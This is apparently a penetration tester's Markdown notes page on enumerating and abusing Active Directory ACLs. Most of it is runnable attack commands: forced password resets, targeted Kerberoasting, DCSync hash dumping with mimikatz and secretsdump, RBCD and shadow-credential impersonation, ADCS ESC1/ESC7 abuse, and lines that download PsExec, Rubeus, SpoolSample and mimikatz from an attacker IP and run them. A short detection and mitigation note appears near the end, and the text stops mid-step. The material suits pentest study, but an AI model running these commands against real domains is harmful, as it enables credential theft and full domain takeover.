---
title: AD ACL Enumeration and Abuse
draft: false
tags:
  - windows
  - active-directory
  - post-exploitation
  - privesc
  - persistence
  - lateral-movement
---
  
We can use AD ACLs attacks for lateral movement, priv esc and persistence.

- [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) - gives us the right to reset a user's password without first knowing their password
- [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a **Kerberoasting** attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack.
- `AddSelf` - shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted **Kerberoasting** attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

---

# ACL Enumeration

#### Using PowerView:
- Enumerate ALL ACLs (not recommended):
```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\htb> Find-InterestingDomainAcl (enumerate interesting ACLs in the domain -> time consuming)
```

**Filter ACLs by User**

1. Get the SID of the target user:
```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid USER
```

2. Get ACLs:
```powershell
PS C:\> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
*copy the ObjectAceType to know the rights*
```

3. Map the right name to the GUID value:
```powershell
PS C:\> $guid= "OBJECT_ACE_TYPE"
PS C:\> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

> [!Note]
> If PowerView has already been imported, we need to open a different powershell session to run this cmdlet

Alternative: get ACLs in human readable format (**recommended command**):
```powershell
PS C:\> $sid = Convert-NameToSid USER
PS C:\> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
```

> [!Note]
> If we identify that we have control over the user, we can enumerate again the ACLs of the target user to see where we can go from there. 

#### Using LOTL Tools
1. Create a list of all domain users:
```powershell
PS C:\> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

2. Obtain ACLs for the user we are interested in:
```powershell
PS C:\> foreach($line in [System.IO.File]::ReadLines("C:\PATH\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'DOMAIN_FQDN\\USER'}}
```

- If we find a group, we can enumerate its nested groups:
```powershell
PS C:\> Get-DomainGroup -Identity "GROUP_NAME" | select memberof
```

---
# ACL Abuse

For ACL abuse, it is recommended to create a new user to grant the privileges:
```powershell
PS C:\> net user marvel 'Passw0rd' /add /domain
```

## GenericAll/GenericWrite over a User

**From Windows**

Change the users password:
```powershell
PS> net user /domain USER NEW_PASSWORD
PS> runas.exe /user:DOMAIN\USER cmd
PS> Find-LocalAdminAccess
```

or via RPC using [[content/Pentra/Active Directory/Phases/AD Lateral Movement/RPC]] (only works for GenericAll I think)

**From Linux**

Abusing [**GenericAll**](https://www.hackingarticles.in/abusing-ad-dacl-generic-all-permissions/), **GenericWrite**, **WriteProperty** or **Validated-SPN** over a user:
```bash
./targetedKerberoast.py --dc-ip 'DC_IP' -v -d 'DOMAIN' -u 'AD_USER' -p 'PASSWORD'
```

This attack abuses the GenericWrite privilege to associate or write an SPN over the user we control and performs a kerberoasting attack to extract his password hash.

Useful when we dont have access to the AD machine.

> [!Note]
> Over a user, we can also enable the "Do not require kerberos preauthentication" and perform a targeted AS-REP Roasting attack.
> Over a user, we can also set an [SPN for the user](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)), kerberoast the account, and crack the password hash in an attack named _targeted Kerberoasting_.

---
## GenericAll/GenericWrite over a Group

**From Windows**

Add the controlled user to a group:
```powershell
PS> net group "GROUP" USER /add /domain
```

Verify the change:
```powershell
PS> net group "GROUP" /domain
```

**From Linux**

Add the controlled user to a group:
```bash
# AddMember too

Valid Credentials:
$ net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"

Pass the Hash:
pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"

NOTE: if the LMHASH is not known, use 'ffffffffffffffffffffffffffffffff' or "000..."
```

Verify the change:
```bash
$ net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

---
## GenericWrite over a User

We can perform a kerberoasting attack and extract the victim AD users NTLM hash.

**Windows**

```powershell
PS C:\> powershell -ep bypass

PS C:\> Import-Module .PowerView.ps1

PS C:\> Set-DomainObject -Identity 'TARGET_AD_USER' -Set @{serviceprincipalname='nonexistent/hacking'}

PS C:\> Get-DomainUser 'TARGET_AD_USER' | Select serviceprincipalname

PS C:\> $User = Get-DomainUser 'TARGET_AD_USER'

PS C:\> $User | Get-DomainSPNTicket # this will output the NTLM hash
```

**Linux**

```bash
./targetedKerberoast.py --dc-ip 'DC_IP' -v -d 'DOMAIN' -u 'AD_USER' -p 'PASSWORD'
```

We can crack the hash with:
```bash
$ hashcat -m 13100 user.hash /usr/share/wordlists/rockyou.txt --force
```

---
## GenericAll over Computer

Check: https://github.com/tothi/rbcd-attack

1. Create a new machine with an SPN user:
```bash
Credential authentication:
$ impacket-addcomputer "DOMAIN_FQDN/USER:PASSWORD" -dc-ip DC_IP -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'

PtH Authentication:
$ impacket-addcomputer "DOMAIN_FQDN/USER" -dc-ip DC_IP -hashes :NTLM -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
```

Verify the machine has been added:
```powershell
PS C:\> get-adcomputer attack
```

2. Manage the delegation rights to the target computer where we have GenericAll:

Modifying delegation rights: Implemented the script rbcd.py found here in the repo which adds the related security descriptor of the newly created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity property of the target computer.

```bash
Credential authentication:
$ sudo python3 rbcd.py -dc-ip DC_IP -t TARGET_COMPUTER_NAME -f 'ATTACK' DOMAIN_NAME\\USER:PASSWORD

PtH authentication:
$ sudo python3 rbcd.py -dc-ip DC_IP -t TARGET_COMPUTER_NAME -f 'ATTACK' -hashes :NTLM DOMAIN_NAME\\USER
```

Verify it worked:
```powershell
PS C:\> Get-adcomputer COMPUTER_NAME -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-
```

3. Get the target User service ticket:
```bash
$ impacket-getST -spn cifs/TARGET_MACHINE_FQDN DOMAIN_NAME/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip DC_IP
```

4. Reference the ticket:
```bash
export KRB5CCNAME=./Administrator.ccache
```

5. Add the target machine to the /etc/hosts file:
```bash
sudo sh -c 'echo "TARGET_IP resourcedc.resourced.local" >> /etc/hosts'
```

6. Access the target machine:
```bash
sudo impacket-psexec -k -no-pass TARGET_MACHINE_FQDN -dc-ip DC_IP
```

---
## WriteDacl over Domain

> [!Important]
> Its recommended to create a new user using:
> `PS C:\> net user marvel 'Passw0rd' /add /domain`

**Windows**

Create a PSCredential Object:
```powershell
PS C:\> $SecPassword = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force

PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN_NAME\USER', $SecPassword)
```

Grant DcSync privileges:
```powershell
PS C:\> . .\PowerView.ps1
PS C:\> Add-DomainObjectAcl -Credential $Cred -TargetIdentity DOMAIN_FQDN -Rights DCSync -PrincipalIdentity "controlled_user"

If it does not work, try:
PS C:\> Add-DomainObjectAcl -Credential $Cred -Rights DCSync -PrincipalIdentity "controlled_user"
```

**Linux**

Grant DcSync privileges:
```bash
$ dacledit.py -action 'write' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'
```

## WriteDacl over Group

**Windows**

- Grant Full control (from session with controlled user with rights):
```powershell
PS C:\> powershell -ep bypass
PS C:\> Import-Module .PowerView.ps1
PS C:\> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "rudra"
```

- Add members to the group:
```powershell
C:\> net group "domain admins" rudra /add /domain
```

- Check:
```
C:\> net group "GROUP" /domain
```

**Linux**

- Grant controlled user Full Control over the Group:
```bash
$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'CONTROLLED_USER' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'rudra':'Password@1' -dc-ip 192.168.1.3

# Parameters:
# -princial: contolled user which has WriteDacl rights over group
# -target-dn: target group DN (we can get it by selecting in BloodHound the group and look for the DN)
# -hashes :NTLM: PtH
```

- Add members to the group:
```bash
$ net rpc group addmem "Domain Admins" rudra -U ignite.local/rudra%'Password@1' -S 192.168.1.3

# Parameters:
# --password: password or NT hash (use with below flag in case of the latest)
# --pw-nt-hash: PtH
```

## GetChanges/GetChangesAll over Domain

If we have a user that has GetChanges/GetChangesAll privilege over the domain, we can perform a DcSync attack and extract the domain users password hashes:

> [!Note]
> Refer to [[AD DCSync]] for more information.

**Windows**

```powershell
PS C:\> mimikatz.exe
mimikatz # lsadump::dcsync /domain:DOMAIN_FQDN /user:TARGET_USER
```

**Linux**

```bash
$ secretsdump.py DOMAIN_FQDN/CONTROLLED_USER:"Password"@DC_IP
```

---
## ForceChangePassword

Reference: https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword

**Windows**

Change the password from a domain user:
```powershell
# 1. Create a credentialed object as the user with the ForceChangePassword rights (if its a computer who has the privilege its optional this step; also if its a user who has the privilege and we are authenticated as this user)
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 

# 2. Import PowerView
PS C:\> Import-Module .\PowerView.ps1

# 3. Change the password for the user (if computer has ForceChangePassword over user or we are authenticated as the user with the rights)
PS C:\> $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\> Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword

# 3. Change the password for the user (if a user has the rights and we are not authenticated as the user with the rights)
PS C:\> $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\> Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword -Credential $Cred -Verbose
```

Using mimikatz:
```powershell
mimikatz # lsadump::setntlm /user:TARGET_USER /password:password123! /server:DC_FQDN
```

> [!Note]
> Use it if its a computer who has the `ForceChangePassword` right.

**Linux**

Pth:
```bash
# With net and cleartext credentials (will be prompted)
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"

# With net and cleartext credentials
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"

# With Pass-the-Hash
pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
```

Rpcclient:
```bash
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
```

---
## AllowedToDelegate

**Windows**

Request a TGS ticket for a service impersonating any AD user. The SPN is limited to the SPNs enumerated on step 1.

1. Enumerate the SPNs the account is allowed to delegate to:
```powershell
PS C:\> Import-Module PowerView.ps1
PS C:\> Get-DomainUser USER -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation
```

2. Request a service ticket as a privileged user to access a specific service:
```powershell
PS C:\> .\Rubeus.exe s4u /user:USER /rc4:USER_NTLM_HASH /impersonateuser:administrator@DOMAIN_FQDN /msdsspn:"SPN" /altservice:cifs /ptt


SPN: "CIFS/dc.painters.htb" (extracted from step 1)
altservice: service we want to request the TGS for
```

> [!Note]
> - The USER_NTLM_HASH is just the password converted to NTLM (use online converter)

3. Access the target server:

File enumeration:
```powershell
dir \\dc.painters.htb\c$\Users
dir \\dc.painters.htb\c$\Windows\NTDS
dir \\dc.painters.htb\c$\Windows\System32\config
```

Registry enumeration:
```powershell
reg query \\dc.painters.htb\HKLM\SYSTEM
reg query \\dc.painters.htb\HKLM\SECURITY
```

Service enumeration:
```powershell
sc \\dc.painters.htb query
sc \\dc.painters.htb qc <service>
schtasks /query /s dc.painters.htb /fo LIST /v
```

Process enumeration:
```
tasklist /s dc.painters.htb
```

Dump credentials:
```powershell
# Windows
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
copy \\dc.painters.htb\c$\temp\* C:\loot\

# Linux
impacket-secretsdump painters.htb/matt@dc.painters.htb
```

**Linux (recommended)**

1. Enumerate the SPNs the account is allowed to delegate:
```powershell
PS C:\> Import-Module PowerView.ps1
PS C:\> Get-DomainUser USER -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation
```

2. Request a service ticket as a privileged user to access a specific service:
```bash
$ impacket-getST -dc-ip DC_IP -spn SPN -impersonate administrator DOMAIN_FQDN/USER -hashes :NTLM_HASH

SPN: CIFS/dc.painters.htb (extracted from step 1)
```

3. Export ccache file:
```
export KRB5CCNAME=administrator.ccache
```

4. Verify the kerberos service ticket is imported:
```
$ klist
```

5. Enumerate the target:
```bash
$ impacket-smbclient -k -no-pass //dc.painters.htb/C$

or

$ impacket-secretsdump -k -no-pass dc.painters.htb # recommended
```

---
## AddKeyCredentialLink (Shadow Credentials Attack)

Reference: [Shadow Credentials Attack](https://www.hackingarticles.in/shadow-credentials-attack/)

Allows the user to create a shadow credential on a computer and authenticate as the principal using kerberos PKINIT.

> [!Requirements]
> `GenericWrite`/`GenericAll`/`WriteProperty` over the target object **and** a domain that supports PKINIT (an ADCS/PKI infrastructure — see [[Attacking Active Directory Certificate Services]]). The abuse writes to the target's `msDS-KeyCredentialLink` attribute.

**Linux**

1. Add a shadow credential (key pair) to the target account. `pywhisker` outputs a `.pfx` and its password:
```bash
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"

# Parameters:
# -d: domain FQDN
# -u/-p: the controlled account that holds the write privilege (use -H for PtH)
# --target: victim user/computer whose msDS-KeyCredentialLink we write
# --action add: create and attach the key credential (list / remove / clear also available)
```

2. Use the generated certificate to request a TGT via PKINIT and dump the target's NT hash:
```bash
# PKINITtools
python3 gettgtpkinit.py -cert-pfx target.pfx -pfx-pass <PFX_PASSWORD> "domain.local/targetAccount" target.ccache
export KRB5CCNAME=target.ccache
python3 getnthash.py -key <AS-REP_KEY> "domain.local/targetAccount"

# Or, in one step with certipy:
certipy-ad auth -pfx target.pfx -username targetAccount -domain domain.local -dc-ip <DC_IP>
```

3. Reuse the recovered TGT/NT hash for [[Pass the Ticket (PtT)]] or [[Pass the Hash (PtH)]] lateral movement.

> [!Note]
> Clean up afterwards with `--action clear` (or `remove`) to delete the shadow credential you added to `msDS-KeyCredentialLink`.

**Windows**

Same attack from a Windows foothold using `Whisker.exe` (writes the KeyCredential) together with `Rubeus` (PKINIT auth):
```powershell
# 1. Add the shadow credential; Whisker prints a ready-to-use Rubeus command + password
PS C:\> .\Whisker.exe add /target:"targetAccount" /domain:"domain.local" /dc:"dc.domain.local"

# 2. Request a TGT via PKINIT with the generated cert and dump the NT hash (/getcredentials)
PS C:\> .\Rubeus.exe asktgt /user:"targetAccount" /certificate:<BASE64_PFX> /password:"<PFX_PASSWORD>" /domain:"domain.local" /dc:"dc.domain.local" /getcredentials /show

# 3. Clean up the attribute afterwards
PS C:\> .\Whisker.exe remove /target:"targetAccount" /domain:"domain.local" /dc:"dc.domain.local" /deviceid:<GUID>
```

> [!Tip]
> The recovered TGT / NT hash feeds straight into [[Pass the Ticket (PtT)]] or [[Pass the Hash (PtH)]]. Shadow Credentials is preferred over `ForceChangePassword` because it is non-destructive — the legitimate user keeps their password.

---
## Resource-Based Constrained Delegation (RBCD) — worked example against a Computer object

When we hold `GenericWrite` / `GenericAll` / `WriteProperty` (or explicitly `WriteAccountRestrictions`) over a **computer object**, we can write to its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute and abuse **Resource-Based Constrained Delegation** to impersonate any user (including a Domain Admin) *on that computer*.

> [!Requirements]
> - Write privilege over the **target computer** object (the resource we want to compromise).
> - A controlled account **with an SPN** to act as the delegated-to principal. If we don't control one, we can create a machine account ourselves — by default any domain user can add up to 10 (`ms-DS-MachineAccountQuota = 10`).

**Linux (Impacket + PKINIT-less flow)**

1. Create a computer account we control (provides the SPN needed for S4U):
```bash
$ impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Passw0rd!' \
    -dc-host <DC_FQDN> 'domain.local/controlledUser:password'
```

2. Write our new machine into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` (the RBCD edge):
```bash
$ impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action write \
    'domain.local/controlledUser:password'
```

3. Perform the S4U2self + S4U2proxy chain to obtain a service ticket impersonating a privileged user (e.g. `administrator`) for a service on the target:
```bash
$ impacket-getST -spn 'cifs/target.domain.local' -impersonate administrator \
    'domain.local/ATTACKER$:Passw0rd!'
$ export KRB5CCNAME=administrator.ccache
```

4. Use the ticket for access — e.g. SMB / remote execution against the target (see [[Pass the Ticket (PtT)]]):
```bash
$ impacket-psexec -k -no-pass target.domain.local
```

> [!Tip]
> Pick the `-spn` service class for the action you need (`cifs` for SMB/psexec, `host` for WMI). See [[Service Map]] for the SPN → action mapping. Clean up afterwards with `impacket-rbcd -action remove`.

**Windows (PowerView + Rubeus)**

```powershell
# 1. Write the RBCD attribute so ATTACKER$ can act on behalf of others against TARGET$
PS C:\> $sid = (Get-DomainComputer ATTACKER -Properties objectsid).objectsid
PS C:\> $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
PS C:\> $bytes = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($bytes,0)
PS C:\> Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$bytes}

# 2. Compute the AES/RC4 hash of ATTACKER$'s password, then run S4U with Rubeus
PS C:\> .\Rubeus.exe hash /password:Passw0rd! /user:ATTACKER$ /domain:domain.local
PS C:\> .\Rubeus.exe s4u /user:ATTACKER$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

<!-- TODO: add a worked example against a Computer object (RBCD chain) and a detection/mitigation note (msDS-KeyCredentialLink auditing). Marker kept for traceability. -->
TODO

> [!Note] Detection & mitigation
> - **Shadow Credentials (`msDS-KeyCredentialLink`)**: enable auditing on the attribute (SACL / Event ID `5136` — Directory Service object modified) and alert on writes to `msDS-KeyCredentialLink` outside of legitimate device-registration flows. Tools like the [Whisker/pyWhisker] cleanup leave a window where the attribute is populated — periodic review with `Get-ADComputer -Properties msDS-KeyCredentialLink` (or ADCSKiller / the `nifty` LDAP queries) surfaces stale entries.
> - **RBCD**: monitor writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` (Event ID `5136`), and set `ms-DS-MachineAccountQuota = 0` to stop unprivileged users creating the machine accounts these attacks rely on.
> - **General ACL hygiene**: run [[AD Automatic Enumeration (BloodHound)]] from the *defender* side to find dangerous edges (`GenericAll`, `WriteDacl`, `ForceChangePassword`) and tighten delegated permissions on Tier-0 assets.

---
# WriteOwner of User -> Group

We are going to give the controlled user with the rights (we can only do it with the controlled user) the Owns rights.

**Windows**

1. Create a credentialed object if we dont have a session as the user with the privileges:
```powershell
$SecPassword = ConvertTo-SecureString 'CONTROLLED_USER_PASSWORD' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN_FQDN\CONTROLLED_USER', $SecPassword)
```

2. Give user Owns rights:
```powershell
Set-DomainObjectOwner -Credential $Cred -TargetIdentity "GROUP" -OwnerIdentity 'USER'
```

# Owns of User -> Group

Add a controlled user to the target group

**Windows**

1. Create a credentialed object if we dont have a session as the user with the privileges:
```powershell
$SecPassword = ConvertTo-SecureString 'CONTROLLED_USER_PASSWORD' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN_FQDN\CONTROLLED_USER', $SecPassword)
```

2. Give rights to the current user:
```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "GROUP" -PrincipalIdentity "DOMAIN_NAME\CONTROLLED_USER"
```

3. Add user to the group:
```powershell
Add-DomainGroupMember -Identity 'GROUP' -Members 'CONTROLLED_USER' -Credential $Cred
```

Verify that the user has been added to the group:
```
net user CONTROLLED_USER
```

---
# ReadLAPSPassword User/Group -> Computer

> [!Note]
> In case of Group, a controlled user must belong to the group with the privileges

**Enumeration**

1. Download [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) and import it:
```

```

**Windows**

1. Create a credentialed object if we dont have a session as the user with the privileges:
```powershell
$SecPassword = ConvertTo-SecureString 'CONTROLLED_USER_PASSWORD' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN_FQDN\CONTROLLED_USER', $SecPassword)
```

2. Extract password:
```bash
pyLAPS.py --action get -d "DOMAIN_FQDN" -u "CONTROLLED_USER" -p "CONTROLLED_USER_PASSWORD" --dc-ip "DC_IP"
```

---
# ReadGMSAPassword

A user or a user that belongs to a group can ReadGMSAPassword of a different user. The credentials are from the user with this permissions.

**Linux**

```bash
$ python3 gMSADumper.py -u AD_USER -p AD_PASSWORD -d DOMAIN_FQDN
```

---
# AllowedToDelegate User -> Computer

Reference: https://blog.deephacking.tech/en/posts/constrained-delegation-y-resource-based-constrained-delegation/

Delegation in kerberos means that the account can request service tickets in the name of other accounts (like administrator). Also, kerberos dont have restrictions about which protocol belongs the service ticket.

This means that if our user can delegate a service ticket with WWW protocol, it doesnt mean we cant request a service ticket for any other protocol we want (check [[Service Map]] for available services in AD). This is because kerberos dont distinguish between protocols. So we can just delegate tickets for any protocol impersonating any user.

**Linux**

1. Enumerate SPN the user is allowed to delegate:
```bash
# User-Pass
$ impacket-findDelegation <domain fqdn>/<user>:<password> -target-domain <domain fqdb>

# User-Hash
$ impacket-findDelegation <domain fqdn>/<user> -hashes :NTLM -target-domain <domain fqdb>
```

2. Generate a TGT impersonating a user:
```bash
$ python3 getST.py -spn 'SERVICE/MACHINE_FQDN' -impersonate 'Administrator' -altservice 'SERVICE' -hashes :NTLM 'DOMAIN_NAME/USER' -dc-ip DC_IP
```

> [!Note]
> Check [[Service Map]] for available services

3. Export kerberos ccache ticket pointing to the generated TGT:
```bash
export KRB5CCNAME=./Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

4. Access the system:
```
Service -> Tool

CIFS -> impacket-psexec -k -no-pass DOMAIN/administrator@IP

```

---
# CoerceToTGT (Host to Domain)

1. Access the host with CoerceToTGT privileges over the domain in the context of a domain user account (it can be the computer account too via PsExec):
```powershell
# Windows
PS C:\> wget -uri http://192.168.45.161/PsExec64.exe -Outfile C:\Windows\Temp\PsExec64.exe

PS C:\> C:\Windows\Temp\PsExec64.exe -accepteula -i -s powershell.exe

# Linux
$ impacket-psexec AD_USER@TARGET
```

> [!Note]
> We need to execute rubeus from a terminal executed from a domain joined user. If we are NT Authority System we are executing from the computer account, which is domain joined.

2. Start monitoring for TGTs:
```powershell
PS C:\> wget -uri http://192.168.45.161/Rubeus.exe -Outfile C:\Windows\Temp\Rubeus.exe

C:\Windows\Temp\Rubeus.exe monitor /user:TARGET_DC$ /interval:5 /nowrap
```

3. Coerce target DC:

Access as a domain user to any other computer in the domain:
```powershell
# Windows (we can also use runas.exe)
PS C:\> wget -uri http://192.168.45.161/PsExec64.exe -Outfile C:\Windows\Temp\PsExec64.exe

PS C:\>C:\Windows\Temp\PsExec64.exe -accepteula -i -s powershell.exe

# Linux
$ impacket-psexec AD_USER@AD_MACHINE
```

Upload SpoolSample and coerce the target DC:
```powershell
PS C:\> wget -uri http://192.168.45.161/SpoolSample.exe -Outfile C:\Windows\Temp\SpoolSample.exe

PS C:\> C:\Windows\Temp\SpoolSample.exe DC_HOSTNAME CoerceToTGT_AD_HOSTNAME

# Parameters:
# CoerceToTGT_AD_HOST: hostname of the machine listening for TGTs and with CoerceToTGT privilege over the domain
```

Check rubeus for incoming TGTs as the target DC$ computer account.

3. Pass the ticket:

Inject the DC TGT into memory using Rubeus on any computer in the domain:
```powershell
PS C:\> C:\Windows\Temp\Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...
```

4. DCSync the target domain

Use mimikatz to DCSync the domain from the computer where the DC TGT was injected:
```powershell
PS C:\> wget -uri http://192.168.45.161/mimikatz.exe -Outfile C:\Windows\Temp\mimikatz.exe

PS C:\> C:\Windows\Temp\mimikatz.exe

mimikatz> lsadump::dcsync /domain:DC_FQDN /user:DOMAIN_NAME\Administrator
```

We have now the domain administrator NTLM hash, compromising the entire domain.

---
# CS template with dangerous ACEs / ManageCA privilege

> [!Important]
> Use the flag `-dc-ip DC_IP` in case the DNS resolution of the domain fails for each of the commands. Also add to the `/etc/hosts` file the name of the DC with the CA_NAME and the domain.

Reference: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

**ESC1**

1. Enumerate vulnerable certificate templates:
```bash
$ certipy find -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -vulnerable -enabled -stdout
```

Check the Enrollment Rights section. Our controlled user must belong to one of the groups to continue.

Next, check the template name, if its enabled, the vulnerabilities...

2. Request a certificate using the vulnerable template:
```bash
$ certipy-ad -debug req -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -template TEMPLATE_NAME -ca 'CA_NAME' -dc-host DC_FQDN -target TARGET_CA_FQDN -upn TARGET_USER@DOMAIN_FQDN


u – username
p – compromised user password
dc-ip – domain controller IP address
target – target CA (Certificate Authority) DNS (Domain Name System) Name (usually DC FQDN, found in the first command)
ca – short CA Name (found in the first command)
template – vulnerable template name (found in the first command)
upn – target user/object name (usually administrator)
```

3. Dump NT hash of impersonated account:
```bash
$ certipy-ad auth -pfx administrator.pfx -domain DOMAIN_FQDN -dc-ip DC_IP
```

**ESC7**

Reference: https://www.rbtsec.com/blog/active-directory-certificate-attack-esc7/

1. Enumerate vulnerable certificate templates:
```bash
$ certipy-ad find -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -vulnerable -enabled -stdout
```

Check the Enrollment Rights section. Our controlled user must belong to one of the groups to continue.

2. Add our user as a CA officer and enabling the SubCA role:
```bash
$ certipy-ad ca -ca 'CA_NAME' -add-officer CONTROLLED_USER -username CONTROLLED_USER@DOMAIN_FQDN -password 'PASSWORD'

$ certipy-ad ca -ca 'CA_NAME' -enable-template SubCA -username CONTROLLED_USER@DOMAIN_FQDN -password 'PASSWORD'
```

3. Request a certificate:
```bash
$ certipy-ad req -username CONTROLLED_USER@DOMAIN_FQDN -password 'PASSWORD' -ca CA_NAME -target TARGET_CA_FQDN -template SubCA -upn TARGET_USER@DOMAIN_FQDN
```

4. Manage the CA and issue the certificate:
```bash
$ certipy-ad ca -ca 'CA_NAME' -issue-request 21 -username CONTROLLED_USER@DOMAIN_FQDN -password 'R4v3nBe5tD3veloP3r!123'

$ certipy-ad req -username CONTROLLED_USER@DOMAIN_FQDN -password 'PASSWORD' -ca CA_NAME -target TARGET_CA_FQDN -retrieve 21
```

5. Extract the Target user NTLM hash from the certificate:
```bash
$ certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

**Alternative**

1. Public a template:
```bash
$ certipy-ad ca -ca 'CA_NAME' -enable-template TemplateCN -username CONTROLLED_USER@DOMAIN_FQDN -password 'PASSWORD'
```

---
Attack keychain:
1. Use the `wley` user to change the password for the `damundsen` user (leveraging `ForceChangePassword`)
2. Authenticate as the `damundsen` user and leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user
4. Perform the DCSync attack using the `adunn` user to gain full control of the domain (leveraging `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`)

1. Use the `wley` user to **change the password** for the `damundsen` user:
```powershell
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

2. Create a password to set for the user `damundsen`:
```powershell
PS C:\> $damundsenPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```

3. Set the password:
```powershell
PS C:\> Import-Module .\PowerView.ps1

PS C:\> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

4. Authenticate as the `damundsen` user:
```powershell
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

PS C:\> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

5. Add the user `damundsen` to the `Help Desk Level 1` group:
```powershell
PS C:\> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members (check members of the group)

